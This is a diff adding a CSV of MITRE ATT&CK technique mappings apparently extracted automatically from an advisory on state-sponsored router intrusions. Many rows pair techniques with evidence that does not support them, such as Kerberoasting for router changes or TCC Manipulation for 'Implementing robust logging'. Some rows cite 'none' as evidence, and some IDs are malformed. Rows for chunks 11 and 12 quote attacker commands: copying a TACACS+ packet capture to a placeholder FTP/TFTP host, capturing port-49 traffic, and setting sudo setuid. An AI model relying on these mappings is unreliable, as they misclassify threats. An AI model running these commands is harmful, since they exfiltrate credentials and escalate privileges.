@@ -1,0 +1,291 @@
+technique_id,technique_name,evidence,chunk,valid_id,evidence_found
+T1584.004,Server,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1584.008,Network Devices,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,True,True
+T1114,Email Collection,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1114.003,Email Forwarding Rule,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1584,Compromise Infrastructure,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,True,True
+T1584.005,Botnet,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1587.001,Malware,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1102,Web Service,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1090,Proxy,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1092,Communication Through Removable Media,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1650,Acquire Access,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1558.003,Kerberoasting,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1590.003,Network Trust Dependencies,Network defenders should ensure any actions taken in response to the CSA are compliant with local laws and regulations within the jurisdictions within which they operate.,1,True,True
+T1593,Search Open Websites/Domains,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1596.005,Scan Databases,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1596.002,WHOIS,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1596.003,Digital Certificates,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1596.004,CDNs,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1584.008,Network Devices,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1584.006,Web Services,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1584.005,Botnet,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1587.001,Malware,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1039,Data from Network Shared Drive,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1016.002,Wi-Fi Discovery,The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.,1,True,True
+T1548.006,TCC Manipulation,Implementing robust logging,2,True,True
+T1548.004,Elevated Execution with Prompt,Implementing robust logging,2,True,True
+T1548.001,Setuid and Setgid,Implementing robust logging,2,True,True
+T1553.001,Gatekeeper Bypass,Implementing robust logging,2,True,True
+T1547.009,Shortcut Modification,Implementing robust logging,2,True,True
+T1564.014,Extended Attributes,Implementing robust logging,2,True,True
+T1546.017,Udev Rules,Implementing robust logging,2,True,True
+T1596,Search Open Technical Databases,Implementing robust logging,2,True,True
+T1055.012,Process Hollowing,Implementing robust logging,2,True,True
+T1587.001,Malware,Implementing robust logging,2,True,True
+T1204.002,Malicious File,Implementing robust logging,2,True,True
+T1574.006,Dynamic Linker Hijacking,Implementing robust logging,2,True,True
+T1590.006,Network Security Appliances,modifying router configurations,3,True,True
+T1590.005,IP Addresses,using virtualized containers on network devices,3,True,True
+T1592,Gather Victim Host Information,using virtualized containers on network devices,3,True,True
+T1590.003,Network Trust Dependencies,modifying router configurations,3,True,True
+T1584.008,Network Devices,using virtualized containers on network devices,3,True,True
+T1590,Gather Victim Network Information,modifying router configurations,3,True,True
+T1595.002,Vulnerability Scanning,"The APT actors will likely continue to adapt their tactics as new vulnerabilities are discovered and as targets implement mitigations,",4,True,True
+T1587.004,Exploits,Initial access Investigations associated with these APT actors indicate that they are having considerable success exploiting publicly known common vulnerabilities and exposures (CVEs) and other avoidable weaknesses within compromised infrastructure.,4,True,False
+T1584.008,Network Devices,"The following list is not exhaustive and the authoring agencies suspect that the APT actors may target other devices (e.g., Fortinet firewalls, Juniper firewalls, Microsoft Exchange, Nokia routers and switches, Sierra Wireless devices, Sonicwall firewalls, etc.).",4,True,True
+T1556.004,Network Device Authentication,The CVE allows for unauthenticated remote code execution (RCE) on firewalls when GlobalProtect is enabled on specific versions/configurations.,4,True,True
+T1212,Exploitation for Credential Access,"While exploiting CVE-2023-20198, the APT actors used the Web Services Management Agent (WSMA) endpoints /webui_wsma_Http or /webui_wsma_Https to bypass authentication and create unauthorized administrative accounts.",4,True,True
+T1558.004,AS-REP Roasting,"In some cases, the APT actors obfuscated requests by “double encoding” portions of the path, e.g., /%2577eb%2575i_%2577sma_Http or /%2577eb%2575i_%2577sma_Https.",4,True,False
+T1584.004,Server,The CVE allows for unauthenticated remote code execution (RCE) on firewalls when GlobalProtect is enabled on specific versions/configurations.,4,True,True
+T1583.004,Server,The CVE allows for unauthenticated remote code execution (RCE) on firewalls when GlobalProtect is enabled on specific versions/configurations.,4,True,True
+T1584.004,Compromise Infrastructure,Initial access Investigations associated with these APT actors indicate that they are having considerable success exploiting publicly known common vulnerabilities and exposures (CVEs) and other avoidable weaknesses within compromised infrastructure.,4,True,False
+T1218.005,Mshta,"In some cases, the APT actors obfuscated requests by “double encoding” portions of the path, e.g., /%2577eb%2575i_%2577sma_Http or /%2577eb%2575i_%2577sma_Https.",4,True,False
+T1068,Exploitation for Privilege Escalation,"While exploiting CVE-2023-20198, the APT actors used the Web Services Management Agent (WSMA) endpoints /webui_wsma_Http or /webui_wsma_Https to bypass authentication and create unauthorized administrative accounts.",4,True,True
+T1558.003,Kerberoasting,"In some cases, the APT actors obfuscated requests by “double encoding” portions of the path, e.g., /%2577eb%2575i_%2577sma_Http or /%2577eb%2575i_%2577sma_Https.",4,True,False
+T1584.004,Compromise Infrastructure,"The APT actors leverage infrastructure, such as virtual private servers (VPSs) and compromised intermediate routers",5,True,True
+T1090.002,External Proxy,"The actors leverage compromised devices and trusted connections or private interconnections (e.g., provider-to-provider or provider-to-customer links) to pivot into other networks",5,True,True
+T1584.008,Network Devices,"In some instances, the actors modify routing and enable traffic mirroring (switch port analyzer (SPAN)/remote SPAN (RSPAN)/encapsulated remote SPAN (ERSPAN) where available) on compromised network devices",5,True,True
+T1090.003,Multi-hop Proxy,"The actors leverage compromised devices and trusted connections or private interconnections (e.g., provider-to-provider or provider-to-customer links) to pivot into other networks",5,True,True
+T1587.004,Exploits,The CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,True,False
+T1046,Network Service Discovery,The actors modify routing and enable traffic mirroring (switch port analyzer (SPAN)/remote SPAN (RSPAN)/encapsulated remote SPAN (ERSPAN) where available) on compromised network devices,5,True,True
+T1592.003,Firmware,"In some instances, the actors modify routing and enable traffic mirroring (switch port analyzer (SPAN)/remote SPAN (RSPAN)/encapsulated remote SPAN (ERSPAN) where available) on compromised network devices",5,True,True
+T1595.001,Scanning IP Blocks,"The actors often simultaneously exploit large numbers of vulnerable, Internet-exposed devices across many IP addresses",5,True,False
+T1210,Exploitation of Remote Services,The CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,True,False
+T1599.001,Network Address Translation Traversal,"Notably, a number of these techniques can obfuscate the actors’ source IP address in system logs, as their actions may be recorded as originating from local IP addresses",5,True,True
+T1571,Non-Standard Port,The actors modify routing and enable traffic mirroring (switch port analyzer (SPAN)/remote SPAN (RSPAN)/encapsulated remote SPAN (ERSPAN) where available) on compromised network devices,5,True,True
+T1020.001,Traffic Duplication,The actors modify routing and enable traffic mirroring (switch port analyzer (SPAN)/remote SPAN (RSPAN)/encapsulated remote SPAN (ERSPAN) where available) on compromised network devices,5,True,True
+T1021.004,SSH,The APT actors have been enabling SSH servers and opening external-facing ports on network devices to maintain encrypted remote access.,6,True,False
+T1021.004,SSH,SSH activity from remote or local IP addresses.,6,True,True
+T1021.004,SSH,The actors may add keys to existing SSH services to regain entry into network devices.,6,True,False
+T1021.004,SSH,"In some cases, the SSH services were established on high, non-default Transmission Control Protocol (TCP) ports using the port numbering scheme of 22x22 or xxx22, though port patterns may vary across intrusions.",6,True,True
+T1021.004,SSH,"Opening standard and non-standard ports, which can open and expose a variety of different services (e.g., Secure Shell [SSH], Secure File Transfer Protocol [SFTP], Remote Desktop Protocol [RDP], File Transfer Protocol [FTP], HTTP, HTTPS).",6,True,False
+T1021.004,SSH,The APT actors enable or abuse built-in HTTP/HTTPS management servers and sometimes reconfigure them to non-default high ports.,6,True,True
+T1021.004,SSH,Note: HTTP servers have been observed using the port numbering scheme of 18xxx.,6,True,True
+T1021.004,SSH,"Following compromise of a router, the following commands and activities have been observed on compromised devices : Executing commands via SNMP.",6,True,False
+T1021.004,SSH,"Following compromise of a router, the following commands and activities have been observed on compromised devices : Web interface panel (POST) requests.",6,True,False
+T1021.004,SSH,"Following compromise of a router, the following commands and activities have been observed on compromised devices : When present, using service or automation credentials (e.g., those used by configuration-archival systems such as RANCID) to enumerate and access other networking devices.",6,True,False
+T1021.004,SSH,"Following compromise of a router, the following commands and activities have been observed on compromised devices : Executing Tcl scripts (e.g., TCLproxy.tcl and map.tcl) on Cisco IOS devices where tclsh was available.",6,True,False
+T1021.004,SSH,"The APT actors often named their ACLs “access-list 20”. When 20 was already used, the actors commonly used 50 or 10.",6,True,True
+T1602.001,SNMP (MIB Dump),Utilizing SNMPwalk (SNMP GET/WALK) to enumerate devices from APT actor-controlled hosts.,7,True,True
+T1572,Protocol Tunneling,"Creating tunnels over protocols, such as Generic Routing Encapsulation (GRE), multipoint GRE (mGRE), or IPsec, on network devices, presumably based on what would be expected in the environment.",7,True,False
+T1602.001,SNMP (MIB Dump),Utilizing SNMPwalk (SNMP GET/WALK) to enumerate devices from APT actor-controlled hosts.,7,True,True
+T1557.003,DHCP Spoofing,Note: None,7,True,False
+T1090,Proxy,"These tunnels allow for the encapsulation of multiple network layer protocols over a single tunnel, which can create persistent and covert channels for data transmission to blend in with normal network traffic.",7,True,True
+T1090.001,Internal Proxy,"These tunnels allow for the encapsulation of multiple network layer protocols over a single tunnel, which can create persistent and covert channels for data transmission to blend in with normal network traffic.",7,True,True
+T1601.001,Patch System Image,Note: None,7,True,False
+T1070.007,Clear Network Connection History and Configurations,Some of these actions may obscure the APT actors’ source IP address in logs due to being logged as a local IP.,7,True,True
+T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,"These tunnels allow for the encapsulation of multiple network layer protocols over a single tunnel, which can create persistent and covert channels for data transmission to blend in with normal network traffic.",7,True,True
+T1040,Network Sniffing,Note: None,7,True,False
+T1556.004,Network Device Authentication,Note: None,7,True,False
+T1090.002,External Proxy,Note: None,7,True,False
+T1219.003,Remote Access Hardware,"leveraging open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse",8,True,True
+T1090.001,Internal Proxy,"leveraging open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse",8,True,True
+T1090,Proxy,"leveraging open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse",8,True,True
+T1572,Protocol Tunneling,"leveraging open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse",8,True,True
+T1018,Remote System Discovery,"Following initial access, the APT actors target protocols and infrastructure involved in authentication—such as Terminal Access Controller Access Control System Plus (TACACS+)—to facilitate lateral movement across network devices, often through SNMP enumeration and SSH.",8,True,True
+T1016,System Network Configuration Discovery,"Following initial access, the APT actors target protocols and infrastructure involved in authentication—such as Terminal Access Controller Access Control System Plus (TACACS+)—to facilitate lateral movement across network devices, often through SNMP enumeration and SSH.",8,True,True
+T1557.003,DHCP Spoofing,"Following initial access, the APT actors target protocols and infrastructure involved in authentication—such as Terminal Access Controller Access Control System Plus (TACACS+)—to facilitate lateral movement across network devices, often through SNMP enumeration and SSH.",8,True,True
+T1098.006,Additional Container Cluster Roles,"execute Python and other 64-bit Linux applications and can read/write device-accessible storage (e.g., flash) as configured.",8,True,True
+T1602.002,Network Device Configuration Dump,"This is achieved either from existing sources in the network (e.g., output of provider scripts) or through active survey of devices and Trivial File Transfer Protocol (TFTP), to include Multiprotocol Label Switching (MPLS) configuration information.",8,True,True
+T1021.004,SSH,"Following initial access, the APT actors target protocols and infrastructure involved in authentication—such as Terminal Access Controller Access Control System Plus (TACACS+)—to facilitate lateral movement across network devices, often through SNMP enumeration and SSH.",8,True,True
+T1571,Non-Standard Port,"leveraging open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse",8,True,True
+T1219.001,IDE Tunneling,"leveraging open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse",8,True,True
+T1557.003,DHCP Spoofing,The APT actors perform several of the modifications or techniques below to facilitate follow-on actions.,9,True,True
+T1078,Valid Accounts,"Creating accounts/users and assigning privileges to those accounts, often via modifying router configurations.",9,True,False
+T1040,Network Sniffing,Capturing network traffic containing credentials via compromised routers is a common method for further enabling lateral movement.,9,True,False
+T1599.001,Network Address Translation Traversal,"The APT actors collect traffic at Layer 2 or 3 (depending on the protocol used), largely from Cisco IOS devices;",9,True,True
+T1556.004,Network Device Authentication,"Leveraging native PCAP functionalities (e.g., Cisco’s Embedded Packet Capture) on routers to collect RADIUS or TACACS+ authentication traffic, which may contain credentials transmitted in cleartext or weakly protected forms.",9,True,True
+T1056.003,Web Portal Capture,"Leveraging native PCAP functionalities (e.g., Cisco’s Embedded Packet Capture) on routers to collect RADIUS or TACACS+ authentication traffic, which may contain credentials transmitted in cleartext or weakly protected forms.",9,True,True
+T1003,OS Credential Dumping,"If a router configuration is collected during initial exploitation and contains a weak hashed Cisco Type 5 (MD5) or 7 (legacy, weak reversible encoding) password.",9,True,False
+T1602.002,Network Device Configuration Dump,"The APT actors collect traffic at Layer 2 or 3 (depending on the protocol used), largely from Cisco IOS devices;",9,True,True
+T1090,Proxy,Modifying a router’s TACACS+ server configuration to point to an APT actor- controlled IP address.,9,True,False
+T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,Capturing network traffic containing credentials via compromised routers is a common method for further enabling lateral movement.,9,True,False
+T1205.002,Socket Filters,"Scanning for open ports and services and mirroring (SPAN/RSPAN sessions), allowing traffic monitoring from multiple interfaces.",9,True,False
+T1557,Adversary-in-the-Middle,Modifying a router’s TACACS+ server configuration to point to an APT actor- controlled IP address.,9,True,False
+T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities",10,True,True
+T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities",10,True,True
+T1048,Exfiltration Over Alternative Protocol,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities",10,True,True
+T1572,Protocol Tunneling,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities",10,True,True
+T1599.001,Network Address Translation Traversal,"Analysis indicates that the APT actors leverage separate (potentially multiple) command and control channels for exfiltration to conceal their data theft within the noise of high-traffic nodes, such as proxies and Network Address Translation (NAT) pools",10,True,False
+T1020,Automated Exfiltration,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities",10,True,True
+T1011,Exfiltration Over Other Network Medium,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities",10,True,True
+T1027,Obfuscated Files or Information,"Configuring a Cisco device to run a Guest Shell container to evade detection from collecting artifacts, data, or PCAP",10,True,True
+T1070.007,Clear Network Connection History and Configurations,"Deleting and/or clearing logs, possibly in tandem with reverting or otherwise modifying stored configuration files to avoid leaving traces of the modifications",10,True,True
+T1030,Data Transfer Size Limits,Exfiltration may be facilitated due to a lack of policy restraints or system configurations limiting the types of data received by peered ISPs,10,True,True
+T1052.001,Exfiltration over USB,"Collecting native PCAP The APT actors collected PCAPs using native tooling on the compromised system, with the primary objective likely being to capture TACACS+ traffic over",10,True,True
+T1016.001,Internet Connection Discovery,"The APT actors collected PCAPs using native tooling on the compromised system, with the primary objective likely being to capture TACACS+ traffic over",10,True,True
+T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,copy bootflash:tac.pcap ftp://<domain/service>:*@<IP>,11,True,True
+T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,copy bootflash:tac.pcap tftp://<IP>/tac.pcap,11,True,True
+T1048.001,Exfiltration Over Symmetric Encrypted Non-C2 Protocol,copy bootflash:tac.pcap ftp://<domain/service>:*@<IP>,11,True,True
+T1048,Exfiltration Over Alternative Protocol,copy bootflash:tac.pcap tftp://<IP>/tac.pcap,11,True,True
+T1571,Non-Standard Port,Target port 49 on the above interface,11,True,True
+T1041,Exfiltration Over C2 Channel,copy bootflash:tac.pcap ftp://<domain/service>:*@<IP>,11,True,True
+T1090,Proxy,copy bootflash:tac.pcap tftp://<IP>/tac.pcap,11,True,True
+T1001,Data Obfuscation,Cisco Type 7 reversible obfuscated encoding,11,True,True
+T1040,Network Sniffing,monitor capture mycap interface <interface-name> both,11,True,True
+T1056.003,Web Portal Capture,monitor capture mycap match ipv4 protocol tcp any any eq 49,11,True,True
+T1548.003,Sudo and Sudo Caching,by editing /etc/sudoers or adding a file under /etc/sudoers.d/,12,True,True
+T1546.004,Unix Shell Configuration Modification,chmod 4755 /usr/bin/sudo,12,True,True
+T1021.004,SSH,logging in via TCP/57722,12,True,True
+T1554,Compromise Host Software Binary,chmod 4755 /usr/bin/sudo,12,True,True
+T1542.004,ROMMONkit,none,12,True,False
+T1546.007,Netsh Helper DLL,none,12,True,False
+T1098.004,SSH Authorized Keys,none,12,True,False
+T1542.005,TFTP Boot,none,12,True,False
+T1499,Endpoint Denial of Service,none,12,True,False
+T1558.003,Kerberoasting,none,12,True,False
+T1092,Communication Through Removable Media,none,12,True,False
+T1555.002,Securityd Memory,none,12,True,False
+T1584.004,Compromise Infrastructure,"The APT actors often take steps to protect their established access, such as compromising mail servers or administrator devices/accounts to monitor for signs that their activity has been detected.",13,True,True
+T1078,Valid Accounts,Verify the authenticity of any configured local accounts and their permission levels.,13,True,True
+T1021,Remote Services,Review remote access configurations for proper application of ACL and transport protocols.,13,True,True
+T1557.003,DHCP Spoofing,Check all routing tables to ensure that all routes are authorized and expected.,13,True,True
+T1584.002,Compromise Infrastructure,"The APT actors often take steps to protect their established access, such as compromising mail servers or administrator devices/accounts to monitor for signs that their activity has been detected.",13,True,True
+T1090,Proxy,"For devices that support Cisco Guest Shell (IOS XE and NX-OS), do not rely on device syslog alone to detect actor activity. Use a combination of device syslog, AAA command accounting, container (Guest Shell) logs, and off-box flow/telemetry.",13,True,True
+T1590.006,Network Security Appliances,"For devices that support Cisco Guest Shell (IOS XE and NX-OS), do not rely on device syslog alone to detect actor activity. Use a combination of device syslog, AAA command accounting, container (Guest Shell) logs, and off-box flow/telemetry.",13,True,True
+T1599.001,Network Address Translation Traversal,Check all routing tables to ensure that all routes are authorized and expected.,13,True,True
+T1070.007,Clear Network Connection History and Configurations,Capture lifecycle and CLI activity with AAA accounting (TACACS+/RADIUS) for configuration/exec commands so that enable/disable and entry actions are recorded.,13,True,True
+T1542.004,ROMMONkit,"For IOS XE, hunt for guestshell enable, guestshell run bash, and guestshell disable. On NX-OS, hunt for guestshell enable, run guestshell, and guestshell destroy.",13,True,True
+T1571.001,Non-Standard Port,"Monitor network services and tunnels  Monitor for management services running on non-standard ports (SSH, FTP, etc.).",14,False,True
+T1542.005,TFTP Boot,"Unauthorized use of file transfer protocols, such as FTP and TFTP.",14,True,True
+T1090.001,Internal Proxy,"Extensive SSH activity against routers, followed by the establishment of both an incoming tunnel and outgoing tunnel—each of which may leverage different protocols.",14,True,True
+T1563.001,SSH Hijacking,"Extensive SSH activity against routers, followed by the establishment of both an incoming tunnel and outgoing tunnel—each of which may leverage different protocols.",14,True,True
+T1071.002,File Transfer Protocols,"Unauthorized use of file transfer protocols, such as FTP and TFTP.",14,True,True
+T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,"Monitor network traffic for abnormal volumes of files transfers to internal FTP servers, which the APT actors may use as staging areas prior to data exfiltration.",14,True,True
+T1059.008,Network Device CLI,dohost (container invoking host CLI),14,True,True
+T1557.003,DHCP Spoofing,None,14,True,False
+T1218.003,CMSTP,None,14,True,False
+T1090.004,Domain Fronting,None,14,True,False
+T1071,Application Layer Protocol,"Extensive SSH activity against routers, followed by the establishment of both an incoming tunnel and outgoing tunnel—each of which may leverage different protocols.",14,True,True
+T1219.001,IDE Tunneling,None,14,True,False
+T1040,Network Sniffing,"Alert on creation/start of any on-box packet capture (e.g., monitor capture ... start, Embedded Packet Capture) or SPAN/RSPAN/ERSPAN session definitions, especially those matching TACACS+ (TCP/49) or RADIUS.",15,True,True
+T1046,Network Service Discovery,"Monitor network traffic for logons from one router to another router, as this should not occur normally.",15,True,False
+T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,Analyze internal FTP Server logs for any logins from unexpected sources.,15,True,True
+T1059.008,Network Device CLI,"Review logs forwarded from network devices for indications of potential malicious behavior, such as: ... Changes to configuration of devices via non-standard methods or from unexpected locations.",15,True,False
+T1070.007,Clear Network Connection History and Configurations,Evidence of clearing locally stored logs,15,True,True
+T1599.001,Network Address Translation Traversal,"Monitor network traffic for logons from one router to another router, as this should not occur normally.",15,True,False
+T1652,Device Driver Discovery,"Alert on config or telemetry indicating new XR host OS services, changes to systemd service states, or unexpected privilege escalations on the host OS.",15,True,True
+T1595.001,Scanning IP Blocks,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1584.008,Network Devices,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1599.001,Network Address Translation Traversal,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1016.001,Internet Connection Discovery,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1557.002,ARP Cache Poisoning,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1590.005,IP Addresses,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1016,System Network Configuration Discovery,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1205.002,Socket Filters,The cmd1 has the additional capability of collecting network packet captures on the compromised network.,16,True,False
+T1057,Process Discovery,The cmd1 has the additional capability of collecting network packet captures on the compromised network.,16,True,False
+T1665,Hide Infrastructure,The cmd1 has the additional capability of collecting network packet captures on the compromised network.,16,True,False
+T1583.005,Botnet,"The APT actors also use a custom SFTP client, which is a Linux binary written in Golang, to transfer encrypted archives from one location to another.",16,True,True
+T1090.003,Multi-hop Proxy,"The APT actors also use a custom SFTP client, which is a Linux binary written in Golang, to transfer encrypted archives from one location to another.",16,True,True
+T1558.003,Kerberoasting,"These APT actors are having considerable success using publicly known CVEs to gain access to networks, so organizations are strongly encouraged to prioritize patching in a way that is proportionate to this threat, such as by sequencing patches to address the",18,True,True
+T1218.008,Odbcconf,"Specifically, organizations should ensure edge devices are not vulnerable to known exploited CVEs.",18,True,True
+T1070.007,Clear Network Connection History and Configurations,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1218.003,CMSTP,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1599.001,Network Address Translation Traversal,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1548.001,Setuid and Setgid,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1556.004,Network Device Authentication,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1070.007,Clear Network Connection History and Configurations,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1218.012,Verclsid,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1608.003,Install Digital Certificate,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1560,Archive Collected Data,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1553.003,SIP and Trust Provider Hijacking,"Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [D3-PM].",18,True,True
+T1584.008,Network Devices,"In at least one instance, the APT actors utilized GRE and MPLS tunnels to move data back to China.",19,True,True
+T1048,Exfiltration Over Alternative Protocol,"An established compromise by these APT actors will likely include recurring, large-scale exfiltration from the compromised network.",19,True,True
+T1686.001,Cloud Firewall,Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices,19,True,True
+T1584.004,Server,"In at least one instance, the APT actors utilized GRE and MPLS tunnels to move data back to China.",19,True,True
+T1599.001,Network Address Translation Traversal,Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices,19,True,True
+T1090,Proxy,Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices,19,True,True
+T1090.001,Internal Proxy,Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices,19,True,True
+T1572,Protocol Tunneling,"In at least one instance, the APT actors utilized GRE and MPLS tunnels to move data back to China.",19,True,True
+T1584.002,DNS Server,"In at least one instance, the APT actors utilized GRE and MPLS tunnels to move data back to China.",19,True,True
+T1686,Disable or Modify System Firewall,Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices,19,True,True
+T1686.002,Network Device Firewall,Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices,19,True,True
+T1571,Non-Standard Port,"Audit and restrict SSH on non-default ports (e.g., 22x22 and xxx22 patterns) commonly used by the APT actors.",20,True,True
+T1090.001,Internal Proxy,"Apply explicit management-plane ACLs at the control plane (e.g., CoPP/CPPr) to allowlist (i.e., default-deny) and rate-limit management protocols.",20,True,False
+T1090.002,External Proxy,Block all egress from the management VRF except to explicitly authorized AAA/syslog/NetFlow/IPFIX/telemetry collectors to prevent actor use of management interfaces as lateral movement conduits or exfiltration paths.,20,True,True
+T1686.003,Windows Host Firewall,"Apply explicit management-plane ACLs at the control plane (e.g., CoPP/CPPr) to allowlist (i.e., default-deny) and rate-limit management protocols.",20,True,False
+T1205.002,Socket Filters,Restrict and monitor SNMP writes.,20,True,True
+T1584.004,Server,Change all weak and default SNMP community strings.,20,True,True
+T1584.008,Network Devices,Restrict and monitor SNMP writes.,20,True,True
+T1048,Exfiltration Over Alternative Protocol,Block all egress from the management VRF except to explicitly authorized AAA/syslog/NetFlow/IPFIX/telemetry collectors to prevent actor use of management interfaces as lateral movement conduits or exfiltration paths.,20,True,True
+T1572,Protocol Tunneling,Actor tradecraft includes issuing SNMP SETs to make covert configuration changes,20,True,True
+T1219,Remote Access Tools,Actor tradecraft includes issuing SNMP SETs to make covert configuration changes,20,True,True
+T1557.003,DHCP Spoofing,Actor tradecraft includes issuing SNMP SETs to make covert configuration changes,20,True,True
+T1599.001,Network Address Translation Traversal,Block all egress from the management VRF except to explicitly authorized AAA/syslog/NetFlow/IPFIX/telemetry collectors to prevent actor use of management interfaces as lateral movement conduits or exfiltration paths.,20,True,True
+T1573 ENC,Encrypted Channel,"Ensure all logs sent to a centralized logging server are transmitted via a secure, authenticated, and encrypted channel (such as IPsec, TLS, or SSH tunnels).",21,False,True
+T1090.001,Internal Proxy,Implementing robust logging  Ensure logging is enabled and forwarded to a centralized server.,21,True,True
+T1048.001,Exfiltration Over Symmetric Encrypted Non-C2 Protocol,"Ensure all logs sent to a centralized logging server are transmitted via a secure, authenticated, and encrypted channel (such as IPsec, TLS, or SSH tunnels).",21,True,True
+T1090.004,Domain Fronting,"Continuously validate static routes, policy-based routing (PBR), and VRF- leak policies at peering edges.",21,True,True
